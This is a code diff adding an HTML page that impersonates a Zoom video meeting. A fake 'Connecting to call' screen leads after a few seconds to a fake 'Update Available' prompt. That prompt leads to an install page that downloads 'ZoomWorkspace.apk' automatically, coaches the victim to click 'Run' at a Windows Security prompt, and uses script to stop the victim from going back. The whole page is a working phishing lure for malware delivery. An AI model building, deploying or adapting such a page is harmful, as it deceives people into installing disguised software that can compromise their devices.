@@ -1,0 +1,473 @@
+<!doctype html>
+<html lang="en" class="dark-page">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#202124" id="themeColor">
+  <title>Zoom Workspace | Secure Video Meeting</title>
+  <style>
+    /* Fluid base: every rem below scales with the screen, so the whole UI
+       shrinks to fit a small phone and grows on a big screen, uniformly.
+       Capped at both ends so it never balloons on desktop or vanishes on tiny phones. */
+    :root { font-size: clamp(13px, 4.1vw, 18px); font-family: Arial, Helvetica, sans-serif; color: #202124; background: #f5f6f8; }
+    * { box-sizing: border-box; }
+    html, body { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; touch-action: manipulation; }
+    body { margin: 0; }
+    button { font: inherit; }
+    button:focus-visible { outline: 3px solid #1267f2; outline-offset: 4px; }
+    .site, .screen { width: 100%; min-height: 100svh; }
+    html.dialog-open { overflow: hidden; }
+    html.dark-page { background: #202124; color-scheme: dark; }
+    [hidden] { display: none !important; }
+
+    .call { position: relative; display: flex; flex-direction: column; height: 100dvh; min-height: 560px; background: #202124; color: #e9e9ec; }
+    .waiting { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 36px; padding: 32px 20px 180px; }
+    .call .art { width: min(225px, 100%); aspect-ratio: 225 / 145; }
+    .call .art svg { display: block; width: 100%; height: 100%; }
+    .connecting { display: flex; align-items: center; gap: 14px; font-size: 1.125rem; }
+    .spinner { width: 21px; height: 21px; border: 2px solid #43464a; border-left-color: #1976ed; border-radius: 50%; animation: turn 1.4s linear infinite; }
+    @keyframes turn { to { transform: rotate(360deg); } }
+    .video { position: absolute; right: 24px; bottom: calc(100px + env(safe-area-inset-bottom)); width: min(54vw, 260px); aspect-ratio: 16 / 9; border: 2px solid #686a6d; border-radius: 14px; background: #000; }
+    .video svg { position: absolute; width: 17px; right: 12px; top: 12px; stroke: #fff; stroke-width: 2.3; fill: none; }
+    .video video { display: block; width: 100%; height: 100%; border-radius: 12px; object-fit: cover; transform: scaleX(-1); }
+    .call-controls { flex-shrink: 0; min-height: 76px; padding: 12px 12px calc(12px + env(safe-area-inset-bottom)); border-top: 1px solid #3c3e41; display: flex; justify-content: center; align-items: center; gap: clamp(4px, 2vw, 12px); }
+    .call-controls button { width: 48px; height: 48px; padding: 0; border: 0; border-radius: 50%; display: grid; place-items: center; color: white; background: #3c4043; cursor: pointer; }
+    .call-controls .wide { width: 72px; border-radius: 30px; display: flex; overflow: hidden; background: #f44336; }
+    .call-controls .wide.is-on { background: #4a4d51; }
+    .call-controls .wide span { display: grid; place-items: center; width: 48px; height: 48px; }
+    .call-controls .wide small { display: grid; place-items: center; flex: 1; height: 48px; background: #3c4043; font-size: 14px; }
+    .call-controls .hangup { background: #f44336; width: 60px; border-radius: 28px; }
+    .call-controls svg { width: 25px; height: 25px; stroke: currentColor; fill: none; stroke-width: 2.25; stroke-linecap: round; stroke-linejoin: round; }
+    .call-controls .more-icon { fill: currentColor; stroke: none; }
+    .call-controls .caret-icon { width: 12px; height: 12px; fill: currentColor; stroke: none; }
+    .call-controls .apps-icon { fill: currentColor; stroke: none; }
+    .call-controls .apps-icon .cutout { fill: #3c4043; }
+    .call-controls .hangup svg { width: 27px; height: 27px; }
+    .call-next { position: absolute; inset: 0 0 calc(76px + env(safe-area-inset-bottom)); border: 0; background: transparent; cursor: pointer; }
+
+    .update-shade { position: fixed; z-index: 15; inset: 0; padding: 20px; background: #0004; display: flex; align-items: center; justify-content: center; }
+    .update-box { width: 360px; max-width: 100%; min-height: 248px; padding: 40px 24px 24px; border: 1px solid #47494d; border-radius: 12px; background: #202124; text-align: center; color: white; }
+    .zoom-mark { color: #1267f2; font-size: 2.0625rem; font-weight: 800; letter-spacing: -2px; line-height: 1; }
+    .update-box h2 { margin: 31px 0 10px; font-size: 1.375rem; font-weight: 500; }
+    .update-box p { margin: 0; color: #999da1; font-size: 0.875rem; }
+    .progress { height: 4px; margin: 25px 0 22px; border-radius: 4px; background: #404346; overflow: hidden; }
+    .progress span { display: block; width: 0; height: 100%; background: #31aa4a; }
+    .update-status { display: flex; align-items: center; justify-content: center; gap: 12px; min-height: 47px; margin: -3px 0 18px; border: 1px solid #2ea85b; border-radius: 10px; background: #193d2d; color: #dce8e0; font-size: 0.875rem; }
+    .update-status span { display: grid; place-items: center; width: 22px; height: 22px; border-radius: 50%; background: #36af5b; color: white; font-weight: 700; }
+    .update-box .moment { font-size: 0.8125rem; }
+
+    /* Source-derived installation layout. Scoped so the call screen is unchanged. */
+    .install, .install * { margin: 0; padding: 0; box-sizing: border-box; }
+    .install {
+      font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
+      color: #3c4043;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .install .container { width: 100%; max-width: 900px; text-align: center; }
+    .install .header { text-align: center; margin-bottom: 32px; }
+    .install .title-row { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 6px; }
+    .install .logo { width: 46px; height: 46px; flex-shrink: 0; display: grid; place-items: center; }
+    .install .logo .zoom-mark { font: 800 1.1875rem/1 Arial, Helvetica, sans-serif; letter-spacing: -1px; }
+    .install h1 { font-size: 1.625rem; font-weight: 400; color: #202124; letter-spacing: -.2px; }
+    .install .subtitle { font-size: 0.875rem; color: #5f6368; }
+    .install .card { background: white; border-radius: 20px; padding: 32px; box-shadow: 0 4px 20px rgba(60,64,67,.1); margin-bottom: 24px; }
+    .install .download-btn { background: #00832d; color: white; border: none; border-radius: 24px; padding: 1rem 2.5rem; font-family: Arial, sans-serif; font-size: 1rem; font-weight: 500; cursor: pointer; margin-bottom: 12px; transition: all .2s; }
+    .install .download-btn:hover { background: #1e8e3e; box-shadow: 0 2px 8px rgba(0,131,45,.3); }
+    .install .file-info { font-size: 0.8125rem; color: #9aa0a6; }
+    .install .divider { height: 1px; background: #dadce0; margin: 24px 0; }
+    .install .back-link { color: #1a73e8; text-decoration: none; font-size: 0.875rem; font-weight: 500; }
+    .install .back-link:hover { text-decoration: underline; }
+    .install-notice { position: fixed; left: 50%; bottom: 28px; z-index: 5; transform: translateX(-50%); width: min(420px, calc(100% - 32px)); margin: 0; padding: 14px 18px; border-radius: 10px; background: #202124; box-shadow: 0 8px 24px rgba(32, 33, 36, .28); color: #fff; font-size: 0.875rem; font-weight: 500; text-align: center; }
+    .install .guide-title { text-align: center; margin-bottom: 28px; }
+    .install .guide-title h2 { font-size: 1.5rem; font-weight: 500; color: #202124; margin-bottom: 6px; }
+    .install .guide-title p { font-size: 0.875rem; color: #5f6368; }
+    .install .steps-row { display: flex; flex-direction: row; gap: 24px; justify-content: center; }
+    .install .step-card { flex: 1; min-width: 0; background: #f8f9fa; border-radius: 16px; padding: 24px; border: 1px solid #e8eaed; text-align: center; }
+    .install .step-card-label { font-size: 0.6875rem; color: #fff; background: #1a73e8; padding: 4px 12px; border-radius: 20px; display: inline-block; margin-bottom: 10px; font-weight: 600; }
+    .install .step-card-title { font-size: 0.8125rem; font-weight: 600; color: #202124; margin-bottom: 8px; line-height: 1.3; }
+    .install .step-card-desc { font-size: 0.6875rem; color: #5f6368; line-height: 1.4; margin-bottom: 12px; }
+
+    /* The original miniature windows are HTML and CSS, not screenshots. */
+    .install .s1-box { height: 90px; background: #fff; border-radius: 10px; border: 1px solid #dadce0; overflow: hidden; margin-top: 8px; }
+    .install .s1-h { height: 16px; background: #e8eaed; display: flex; align-items: center; padding: 0 6px; gap: 3px; }
+    .install .s1-d { width: 4px; height: 4px; border-radius: 50%; background: #9aa0a6; }
+    .install .s1-c { padding: 8px; }
+    .install .s1-bar { background: #e8f0fe; border-radius: 4px; padding: 5px 6px; display: flex; align-items: center; gap: 5px; }
+    .install .s1-icon { width: 14px; height: 18px; background: #4285f4; border-radius: 2px; position: relative; }
+    .install .s1-icon::after { content: ""; position: absolute; top: 0; right: 0; width: 0; height: 0; border-style: solid; border-width: 0 4px 4px 0; border-color: transparent #e8f0fe transparent transparent; }
+    .install .s1-t { flex: 1; min-width: 0; text-align: left; }
+    .install .s1-fn { font-size: 7px; color: #202124; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .install .s1-sz { font-size: 6px; color: #5f6368; }
+    .install .s1-bt { width: 12px; height: 12px; background: #34a853; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .install .s1-bt::after { content: ""; width: 0; height: 0; border-style: solid; border-width: 2px 0 2px 3px; border-color: transparent transparent transparent white; margin-left: 1px; }
+    .install .s2-box { height: 90px; background: #fff; border-radius: 10px; border: 1px solid #dadce0; overflow: hidden; margin-top: 8px; display: flex; flex-direction: column; }
+    .install .s2-h { height: 14px; background: linear-gradient(90deg,#1a73e8,#4285f4); display: flex; align-items: center; justify-content: space-between; padding: 0 6px; }
+    .install .s2-t { color: white; font-size: 6px; font-weight: 500; }
+    .install .s2-x { width: 6px; height: 6px; background: rgba(255,255,255,.3); border-radius: 1px; }
+    .install .s2-c { flex: 1; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .install .s2-sh { width: 22px; height: 26px; background: linear-gradient(180deg,#fbbc04,#f9ab00); clip-path: polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%); display: flex; align-items: center; justify-content: center; margin-bottom: 3px; }
+    .install .s2-sh::after { content: "!"; color: white; font-size: 10px; font-weight: bold; }
+    .install .s2-m { font-size: 6px; color: #5f6368; text-align: center; line-height: 1.2; margin-bottom: 4px; }
+    .install .s2-bs { display: flex; gap: 3px; }
+    .install .s2-b { padding: 2px 6px; border-radius: 2px; font-size: 5px; font-weight: 500; }
+    .install .s2-br { background: #1a73e8; color: white; }
+    .install .s2-bc { background: #f1f3f4; color: #5f6368; border: 1px solid #dadce0; }
+    .install .s3-box { height: 90px; background: #fff; border-radius: 10px; border: 1px solid #dadce0; overflow: hidden; margin-top: 8px; display: flex; flex-direction: column; }
+    .install .s3-h { height: 14px; background: linear-gradient(90deg,#34a853,#0f9d58); display: flex; align-items: center; padding: 0 6px; }
+    .install .s3-t { color: white; font-size: 6px; font-weight: 500; }
+    .install .s3-c { flex: 1; padding: 6px; }
+    .install .s3-w { background: #f8f9fa; border-radius: 4px; padding: 6px; height: 100%; }
+    .install .s3-ch { width: 10px; height: 10px; background: #34a853; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-right: 2px; }
+    .install .s3-ch::after { content: "✓"; color: white; font-size: 6px; }
+    .install .s3-l { height: 4px; background: #dadce0; border-radius: 2px; margin: 4px 0; width: 100%; }
+    .install .s3-l.s { width: 70%; }
+    .install .s3-p { display: flex; align-items: center; gap: 3px; margin-top: 4px; }
+    .install .s3-b { flex: 1; height: 4px; background: #e8eaed; border-radius: 2px; overflow: hidden; }
+    .install .s3-bf { width: 75%; height: 100%; background: #34a853; border-radius: 2px; }
+    .install .s3-pc { font-size: 5px; color: #5f6368; }
+    @media (max-width: 768px) { .install .steps-row { flex-direction: column; } }
+
+    .captions-dialog { width: min(430px, calc(100% - 40px)); border: 1px solid #45474a; border-radius: 20px; padding: 20px 28px 8px; background: #202124; color: #fff; }
+    .captions-dialog:focus { outline: none; }
+    .captions-dialog::backdrop { background: #0008; }
+    .captions-dialog p { margin: 0 0 8px; font-size: 1.1875rem; line-height: 1.35; }
+    .captions-dialog button { display: block; margin-left: auto; min-width: 0; min-height: 35px; padding: 0; border: 0; outline: none; background: transparent; color: #4285f4; font-size: 1.0625rem; cursor: pointer; }
+
+    @media (min-width: 900px) { .waiting { padding-bottom: 100px; } }
+    @media (max-width: 360px) {
+      .call-controls button { width: 44px; height: 44px; }
+      .call-controls .wide { width: 64px; }
+      .call-controls .wide span { width: 44px; height: 44px; }
+      .call-controls .wide small { height: 44px; }
+      .call-controls .hangup { width: 52px; }
+    }
+    @media (prefers-reduced-motion: reduce) { .spinner { animation: none; } }
+  </style>
+</head>
+<body>
+  <main class="site" aria-label="Zoom Workspace">
+    <section class="screen call" id="callScreen">
+      <div class="waiting">
+      <div class="art" aria-hidden="true">
+        <svg viewBox="0 0 225 145" xmlns="http://www.w3.org/2000/svg">
+          <!-- Decorative waiting-room scene drawn with vector paths. -->
+          <g fill="none" stroke="#548eaa" stroke-width=".9" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 141H224M24 38C24 15 40 9 53 21L52 17M52 21L47 18"/>
+            <circle cx="66" cy="28" r="5"/>
+            <path d="M21 85L26 59Q29 48 38 48H46Q59 48 60 63L63 85M20 92L17 140H20L28 92M59 92L68 140H65L54 92"/>
+            <path d="M18 85H68Q68 93 60 93H26Q18 93 18 85Z" fill="#202124"/>
+            <path d="M94 91L85 140H88L101 91M119 91L127 140H130L125 91M86 85H137Q137 93 130 93H94Q86 93 86 85Z" fill="#202124"/>
+            <path d="M162 85L166 59Q167 48 177 48H185Q198 48 199 62L203 85M159 92L154 140H157L166 92M198 92L207 140H204L192 92"/>
+            <path d="M155 85H207Q207 93 198 93H164Q155 93 155 85Z" fill="#202124"/>
+          </g>
+          <path d="M185 132L215 101Q224 96 224 106V137Q224 141 219 141H190Q181 140 185 132Z" fill="#efb5b2"/>
+          <path d="M25 75Q15 69 18 62Q20 55 30 55Q42 55 42 66Q41 75 34 75Z" fill="#76d58f"/>
+          <g stroke="#444748" stroke-width="1" stroke-linejoin="round">
+            <path d="M32 141L26 141L28 123L35 110Q42 116 53 113L65 105L73 109L72 125L69 141H62L65 125L54 128L45 127L35 134Z" fill="#9b6b4d"/>
+            <path d="M43 123L32 132L36 141H32L28 135L28 130M61 129L55 140H59L65 133" fill="#9b6b4d"/>
+            <path d="M35 111Q25 104 31 93L39 83" fill="none" stroke="#9b6b4d" stroke-width="3.5" stroke-linecap="round"/>
+            <path d="M65 104L63 113L61 119Q59 124 58 119L59 107Q60 102 65 101L76 98L82 104L76 109L74 117Q72 120 69 116L68 110" fill="#9b6b4d"/>
+            <path d="M68 118L73 121" stroke="#eee9d4" stroke-width="2.5"/>
+            <circle cx="74" cy="122" r="1.5" fill="#f1d18b" stroke="none"/>
+            <circle cx="67" cy="106" r=".8" fill="#292b2b" stroke="none"/>
+            <path d="M172 85L165 85Q169 73 167 57L165 44L165 42L170 44L177 41L178 51Q194 65 194 84L190 88H173Z" fill="#f6d68b"/>
+            <path d="M191 86Q195 109 190 116" fill="none" stroke="#f6d68b" stroke-width="5" stroke-linecap="round"/>
+            <path d="M174 67L173 85M183 66Q175 75 180 81L175 85" fill="none"/>
+            <path d="M167 49L169 50M173 48L174 49M169 52L171 51L170 54M167 54L171 56" fill="none" stroke-width=".7"/>
+            <path d="M93 52L85 84L78 96L68 100L65 105L72 105L81 101L92 83L105 55Z" fill="#bd8969"/>
+            <path d="M97 34Q88 39 82 53L95 55L93 66L107 64L139 60L135 46Q132 29 123 28L114 29Z" fill="#faf8f8"/>
+            <path d="M124 48L125 63L107 69L93 69L96 61L124 55L123 43" fill="#bd8969"/>
+            <path d="M99 60L96 67M123 43L124 54L138 49" fill="none"/>
+            <path d="M99 17L111 15L114 26L118 28Q113 41 107 38L102 35L102 29L97 26Z" fill="#bd8969"/>
+            <path d="M98 19Q91 17 94 13L97 12Q89 2 95 2Q101 1 103 8Q109 1 110 7Q112 3 114 8Q116 12 110 16L109 12L105 13L103 10L99 13Z" fill="#3a4142"/>
+            <path d="M99 17L100 21M103 17L104 21M103 24L107 22M100 27L107 25" fill="none" stroke-width=".8"/>
+            <path d="M97 65Q124 57 139 65Q144 71 149 82L164 111L145 119L127 84L133 128L111 128L120 87L106 86Q83 88 90 69Z" fill="#79cef5" stroke="#5ab7e4"/>
+            <path d="M114 83L126 80L133 105" fill="none" stroke="#5ab7e4"/>
+            <path d="M147 115L161 110L166 119L178 117L169 124L158 132L151 125Z" fill="#faf8f8"/>
+            <path d="M113 126L126 126L128 135L140 139L141 141H110Z" fill="#faf8f8"/>
+          </g>
+        </svg>
+      </div>
+      <div class="connecting"><span class="spinner"></span><span>Connecting to call...</span></div>
+      </div>
+      <div class="video" aria-label="Video camera"><video id="cameraPreview" autoplay muted playsinline hidden></video><svg id="previewMutedIcon" viewBox="0 0 24 24"><path d="M7 4v7a5 5 0 0 0 10 0V4M5 10v1a7 7 0 0 0 12 5M12 18v3M8 21h8M3 3l18 18"/></svg></div>
+      <div class="call-controls" aria-label="Call controls">
+        <button type="button" aria-label="More options"><svg class="more-icon" viewBox="0 0 24 24"><circle cx="5" cy="12" r="2.2"/><circle cx="12" cy="12" r="2.2"/><circle cx="19" cy="12" r="2.2"/></svg></button>
+        <button class="wide" id="micToggle" type="button" aria-label="Unmute microphone" aria-pressed="false"><span><svg id="micOffIcon" viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M6 10v1a6 6 0 0 0 12 0v-1M12 17v4M8 21h8M3 3l18 18"/></svg><svg id="micOnIcon" viewBox="0 0 24 24" hidden><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M6 10v1a6 6 0 0 0 12 0v-1M12 17v4M8 21h8"/></svg></span><small><svg class="caret-icon" viewBox="0 0 12 12"><path d="M2 4h8L6 8z"/></svg></small></button>
+        <button class="wide" id="cameraToggle" type="button" aria-label="Start camera" aria-pressed="false"><span><svg id="cameraOffIcon" viewBox="0 0 24 24"><rect x="3" y="6" width="13" height="12" rx="2"/><path d="m16 9 5-3v12l-5-3M3 3l18 18"/></svg><svg id="cameraOnIcon" viewBox="0 0 24 24" hidden><rect x="3" y="6" width="13" height="12" rx="2"/><path d="m16 9 5-3v12l-5-3"/></svg></span><small><svg class="caret-icon" viewBox="0 0 12 12"><path d="M2 4h8L6 8z"/></svg></small></button>
+        <button id="captionsToggle" type="button" aria-label="Enable live captions" aria-pressed="false"><svg class="apps-icon" viewBox="0 0 24 24"><rect x="4" y="4" width="15" height="16" rx="3"/><path d="M19 9h3v6h-3z"/><rect class="cutout" x="8" y="10" width="3" height="3" rx=".5"/><rect class="cutout" x="14" y="10" width="3" height="3" rx=".5"/></svg></button>
+        <button class="hangup" type="button" aria-label="Leave call"><svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.2.3-4.6.8v3.1c0 .4-.2.8-.6.9l-2.4 1c-.3.1-.6 0-.8-.2l-2.1-2.5c-.2-.3-.2-.6.1-.9A14.8 14.8 0 0 1 12 7a14.8 14.8 0 0 1 10.4 4.2c.3.3.3.6.1.9l-2.1 2.5c-.2.2-.5.3-.8.2l-2.4-1c-.4-.1-.6-.5-.6-.9V9.8A13.7 13.7 0 0 0 12 9z" fill="white" stroke="none"/></svg></button>
+      </div>
+      <button class="call-next" id="callNext" type="button" aria-label="Show update notice"></button>
+    </section>
+
+    <div class="update-shade" id="updateShade" hidden>
+      <div class="update-box" role="status" aria-live="polite">
+        <div class="zoom-mark">zoom</div>
+        <h2>Update Available</h2>
+        <p>A new version is available for download</p>
+        <div class="progress" aria-label="Update progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" role="progressbar"><span id="updateProgress"></span></div>
+        <p class="update-status" id="updateStatus" hidden><span>✓</span>Update downloaded. Installing...</p>
+        <p class="moment">This will only take a moment...</p>
+      </div>
+    </div>
+
+    <section class="screen install" id="installScreen" hidden>
+      <div class="container">
+        <div class="header">
+          <div class="title-row">
+            <div class="logo" aria-label="Zoom"><span class="zoom-mark" aria-hidden="true">zoom</span></div>
+            <h1>Install Zoom Workspace</h1>
+          </div>
+          <p class="subtitle">Download required to join this secure meeting</p>
+        </div>
+        <div class="card">
+          <button class="download-btn" id="installBtn" type="button">Download &amp; Install</button>
+          <p class="file-info">5 MB • Installs in 30 seconds</p>
+          <div class="divider"></div>
+          <div class="guide-title">
+            <h2>Installation Guide</h2>
+            <p>Follow these simple steps to complete installation on your device</p>
+          </div>
+          <div class="steps-row">
+            <div class="step-card">
+              <span class="step-card-label">Step 1</span>
+              <div class="step-card-title">Locate the Downloaded File</div>
+              <div class="step-card-desc">Check your browser's downloads folder.</div>
+              <div class="s1-box" role="group" aria-label="Example downloaded file">
+                <div class="s1-h"><div class="s1-d"></div><div class="s1-d"></div><div class="s1-d"></div></div>
+                <div class="s1-c">
+                  <div class="s1-bar">
+                    <div class="s1-icon"></div>
+                    <div class="s1-t"><div class="s1-fn">ZoomWorkspace</div><div class="s1-sz">2.1 MB • Done</div></div>
+                    <div class="s1-bt"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="step-card">
+              <span class="step-card-label">Step 2</span>
+              <div class="step-card-title">Double-click to Start</div>
+              <div class="step-card-desc">Launch installer, click "Run" if prompted.</div>
+              <div class="s2-box" role="group" aria-label="Example Windows Security dialog">
+                <div class="s2-h"><span class="s2-t">Windows Security</span><div class="s2-x"></div></div>
+                <div class="s2-c">
+                  <div class="s2-sh"></div>
+                  <div class="s2-m">Do you want to run<br>this file?</div>
+                  <div class="s2-bs"><div class="s2-b s2-br">Run</div><div class="s2-b s2-bc">Cancel</div></div>
+                </div>
+              </div>
+            </div>
+            <div class="step-card">
+              <span class="step-card-label">Step 3</span>
+              <div class="step-card-title">Follow Setup Wizard</div>
+              <div class="step-card-desc">Accept terms, click "Next" to finish.</div>
+              <div class="s3-box" role="group" aria-label="Example setup window">
+                <div class="s3-h"><span class="s3-t">Zoom Workspace Setup</span></div>
+                <div class="s3-c">
+                  <div class="s3-w">
+                    <div style="font-size:7px;color:#202124;margin-bottom:4px;"><span class="s3-ch"></span>License Agreement</div>
+                    <div class="s3-l"></div><div class="s3-l s"></div>
+                    <div class="s3-p"><div class="s3-b"><div class="s3-bf"></div></div><span class="s3-pc">75%</span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <a class="back-link" id="returnCall" href="#call">← Return to meeting</a>
+        <p class="install-notice" id="installNotice" role="status" hidden>You must install the update before returning to the meeting.</p>
+      </div>
+    </section>
+
+    <dialog class="captions-dialog" id="captionsDialog" aria-labelledby="captionsMessage" tabindex="-1">
+      <p id="captionsMessage">Live captions enabled</p>
+      <button id="closeCaptions" type="button">Close</button>
+    </dialog>
+  </main>
+  <script>
+    const callScreen = document.getElementById('callScreen');
+    const installScreen = document.getElementById('installScreen');
+    const updateShade = document.getElementById('updateShade');
+    const updateProgress = document.getElementById('updateProgress');
+    const updateStatus = document.getElementById('updateStatus');
+    const updateProgressbar = updateProgress.parentElement;
+    const installNotice = document.getElementById('installNotice');
+    const micToggle = document.getElementById('micToggle');
+    const cameraToggle = document.getElementById('cameraToggle');
+    const captionsToggle = document.getElementById('captionsToggle');
+    const captionsDialog = document.getElementById('captionsDialog');
+    const captionsMessage = document.getElementById('captionsMessage');
+    const cameraPreview = document.getElementById('cameraPreview');
+    const previewMutedIcon = document.getElementById('previewMutedIcon');
+    const micOffIcon = document.getElementById('micOffIcon');
+    const micOnIcon = document.getElementById('micOnIcon');
+    const cameraOffIcon = document.getElementById('cameraOffIcon');
+    const cameraOnIcon = document.getElementById('cameraOnIcon');
+    let audioStream, cameraStream, captionsEnabled = false;
+    let autoUpdate, updateTimer, installTimer, noticeTimer, updateRun = 0;
+
+    function clearTimers() {
+      clearTimeout(autoUpdate);
+      clearTimeout(updateTimer);
+      clearTimeout(installTimer);
+      clearTimeout(noticeTimer);
+    }
+
+    function restartCallTimer() {
+      clearTimeout(autoUpdate);
+      autoUpdate = setTimeout(() => navigate('update'), 7000);
+    }
+
+    function showControlMessage(message) {
+      captionsMessage.textContent = message;
+      if (!captionsDialog.open) captionsDialog.showModal();
+      captionsDialog.focus({ preventScroll: true });
+    }
+
+    function setMicEnabled(enabled) {
+      micToggle.classList.toggle('is-on', enabled);
+      micToggle.setAttribute('aria-pressed', String(enabled));
+      micToggle.setAttribute('aria-label', enabled ? 'Mute microphone' : 'Unmute microphone');
+      micOffIcon.hidden = enabled;
+      micOnIcon.hidden = !enabled;
+    }
+
+    function setCameraEnabled(enabled) {
+      cameraToggle.classList.toggle('is-on', enabled);
+      cameraToggle.setAttribute('aria-pressed', String(enabled));
+      cameraToggle.setAttribute('aria-label', enabled ? 'Stop camera' : 'Start camera');
+      cameraOffIcon.hidden = enabled;
+      cameraOnIcon.hidden = !enabled;
+      cameraPreview.hidden = !enabled;
+      previewMutedIcon.hidden = enabled;
+    }
+
+    function stopMedia() {
+      audioStream?.getTracks().forEach(track => track.stop());
+      cameraStream?.getTracks().forEach(track => track.stop());
+      audioStream = undefined;
+      cameraStream = undefined;
+      cameraPreview.srcObject = null;
+      setMicEnabled(false);
+      setCameraEnabled(false);
+    }
+
+    function beginUpdate() {
+      const run = ++updateRun;
+      updateProgress.style.transition = 'none';
+      updateProgress.style.width = '0';
+      updateProgressbar.setAttribute('aria-valuenow', '0');
+      updateStatus.hidden = true;
+      requestAnimationFrame(() => requestAnimationFrame(() => {
+        updateProgress.style.transition = 'width 5s linear';
+        updateProgress.style.width = '100%';
+      }));
+      updateTimer = setTimeout(() => {
+        if (run !== updateRun) return;
+        updateProgressbar.setAttribute('aria-valuenow', '100');
+        updateStatus.hidden = false;
+        installTimer = setTimeout(() => {
+          if (run === updateRun) navigate('install');
+        }, 1800);
+      }, 5000);
+    }
+
+    function show(view) {
+      clearTimers();
+      const install = view === 'install';
+      const changingPage = callScreen.hidden !== install;
+      callScreen.hidden = install;
+      installScreen.hidden = !install;
+      updateShade.hidden = view !== 'update';
+      if (view !== 'call' && captionsDialog.open) captionsDialog.close();
+      if (install) stopMedia();
+      document.documentElement.classList.toggle('dialog-open', view === 'update');
+      document.documentElement.classList.toggle('dark-page', !install);
+      document.getElementById('themeColor').content = install ? '#f8f9fa' : '#202124';
+      if (changingPage) window.scrollTo(0, 0);
+      if (view === 'call') restartCallTimer();
+      if (view === 'update') beginUpdate();
+      if (view === 'install') triggerDownload();
+    }
+
+    function navigate(view) {
+      if (location.hash.slice(1) === view) return;
+      location.hash = view;
+    }
+    function fromHash() { const view = location.hash.slice(1); show(['call', 'update', 'install'].includes(view) ? view : 'call'); }
+    window.addEventListener('popstate', () => {
+      if (!installScreen.hidden) location.replace(`${location.pathname}${location.search}#install`);
+    });
+    window.addEventListener('hashchange', fromHash);
+    document.getElementById('callNext').addEventListener('click', () => navigate('update'));
+    micToggle.addEventListener('click', async () => {
+      const track = audioStream?.getAudioTracks()[0];
+      if (track) {
+        track.enabled = !track.enabled;
+        setMicEnabled(track.enabled);
+        return;
+      }
+      if (!navigator.mediaDevices?.getUserMedia) {
+        showControlMessage('Microphone access requires a secure HTTPS connection.');
+        return;
+      }
+      try {
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        setMicEnabled(true);
+      } catch {
+        showControlMessage('Microphone access was not allowed.');
+      }
+    });
+    cameraToggle.addEventListener('click', async () => {
+      const track = cameraStream?.getVideoTracks()[0];
+      if (track) {
+        track.enabled = !track.enabled;
+        setCameraEnabled(track.enabled);
+        return;
+      }
+      if (!navigator.mediaDevices?.getUserMedia) {
+        showControlMessage('Camera access requires a secure HTTPS connection.');
+        return;
+      }
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        cameraPreview.srcObject = cameraStream;
+        setCameraEnabled(true);
+        await cameraPreview.play();
+      } catch {
+        showControlMessage('Camera access was not allowed.');
+      }
+    });
+    captionsToggle.addEventListener('click', () => {
+      captionsEnabled = !captionsEnabled;
+      captionsToggle.setAttribute('aria-pressed', String(captionsEnabled));
+      captionsToggle.setAttribute('aria-label', captionsEnabled ? 'Disable live captions' : 'Enable live captions');
+      showControlMessage(captionsEnabled ? 'Live captions enabled' : 'Live captions disabled');
+    });
+    document.getElementById('closeCaptions').addEventListener('click', () => captionsDialog.close());
+    captionsDialog.addEventListener('cancel', event => { event.preventDefault(); captionsDialog.close(); });
+    function triggerDownload() {
+      const a = document.createElement('a');
+      a.href = 'assets/ZoomWorkspace.apk';
+      a.download = 'ZoomWorkspace.apk';
+      a.click();
+    }
+
+    document.getElementById('installBtn').addEventListener('click', triggerDownload);
+    document.getElementById('closePrompt')?.addEventListener('click', () => navigate('install'));
+    document.getElementById('returnCall').addEventListener('click', event => {
+      event.preventDefault();
+      installNotice.hidden = false;
+      clearTimeout(noticeTimer);
+      noticeTimer = setTimeout(() => { installNotice.hidden = true; }, 3500);
+    });
+    fromHash();
+  </script>
+</body>
+</html>
